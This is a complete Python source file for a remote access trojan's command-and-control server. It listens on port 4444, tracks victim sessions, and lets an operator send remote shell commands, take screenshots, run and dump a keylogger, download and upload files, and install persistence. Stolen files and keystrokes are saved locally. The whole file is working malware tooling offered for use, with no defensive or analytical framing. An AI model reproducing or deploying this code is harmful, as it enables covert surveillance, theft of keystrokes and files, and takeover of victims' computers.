import socket
import threading
import os
import base64
from datetime import datetime

class RATServer:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.clients = {}
        self.current_client = None
        
    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)
        print(f"[*] RAT Server listening on {self.host}:{self.port}")
        
        accept_thread = threading.Thread(target=self.accept_connections, args=(server,))
        accept_thread.daemon = True
        accept_thread.start()
        
        self.command_shell()
    
    def accept_connections(self, server):
        while True:
            client_socket, addr = server.accept()
            client_id = f"{addr[0]}:{addr[1]}"
            self.clients[client_id] = client_socket
            print(f"\\n[+] New connection from {client_id}")
            print("rat> ", end='', flush=True)
    
    def command_shell(self):
        while True:
            cmd = input("rat> ").strip()
            
            if not cmd:
                continue
                
            if cmd == "list":
                if not self.clients:
                    print("[!] No active connections")
                else:
                    print("\\n[*] Active Sessions:")
                    for i, client_id in enumerate(self.clients.keys()):
                        marker = " <-- current" if client_id == self.current_client else ""
                        print(f"  [{i}] {client_id}{marker}")
                continue
                
            if cmd.startswith("select "):
                try:
                    idx = int(cmd.split()[1])
                    client_id = list(self.clients.keys())[idx]
                    self.current_client = client_id
                    print(f"[*] Selected: {client_id}")
                except (IndexError, ValueError):
                    print("[!] Invalid selection")
                continue
            
            if cmd == "help":
                self.show_help()
                continue
                
            if cmd == "exit":
                print("[*] Shutting down...")
                break
                
            # Send command to current client
            if not self.current_client:
                print("[!] No client selected. Use 'list' and 'select <id>'")
                continue
                
            try:
                self.send_command(cmd)
            except Exception as e:
                print(f"[!] Error: {e}")
                del self.clients[self.current_client]
                self.current_client = None
    
    def send_command(self, cmd):
        client = self.clients[self.current_client]
        client.send(cmd.encode())
        
        if cmd == "screenshot":
            self.receive_file(client, f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
        elif cmd.startswith("download "):
            filename = os.path.basename(cmd.split(" ", 1)[1])
            self.receive_file(client, filename)
        elif cmd == "keylog_dump":
            response = self.receive_response(client)
            print(f"\\n[*] Keylog Data:\\n{response}")
        else:
            response = self.receive_response(client)
            print(response)
    
    def receive_response(self, client):
        client.settimeout(30)
        chunks = []
        while True:
            try:
                chunk = client.recv(4096)
                if chunk.endswith(b"<END>"):
                    chunks.append(chunk[:-5])
                    break
                chunks.append(chunk)
            except socket.timeout:
                break
        return b''.join(chunks).decode(errors='ignore')
    
    def receive_file(self, client, filename):
        data = b''
        while True:
            chunk = client.recv(4096)
            if chunk.endswith(b"<END>"):
                data += chunk[:-5]
                break
            data += chunk
        
        with open(filename, 'wb') as f:
            f.write(base64.b64decode(data))
        print(f"[+] Saved: {filename}")
    
    def show_help(self):
        print("""
╔══════════════════════════════════════════════════════╗
║                  RAT COMMANDS                        ║
╠══════════════════════════════════════════════════════╣
║  list              - Show all connected clients      ║
║  select <id>       - Select a client by index        ║
║  shell <cmd>       - Execute shell command           ║
║  screenshot        - Capture screenshot              ║
║  keylog_start      - Start keylogger                 ║
║  keylog_stop       - Stop keylogger                  ║
║  keylog_dump       - Retrieve logged keys            ║
║  download <path>   - Download file from target       ║
║  upload <path>     - Upload file to target           ║
║  persist           - Install persistence             ║
║  sysinfo           - Get system information          ║
║  exit              - Shutdown server                 ║
╚══════════════════════════════════════════════════════╝
        """)

if __name__ == "__main__":
    server = RATServer(host='0.0.0.0', port=4444)
    server.start()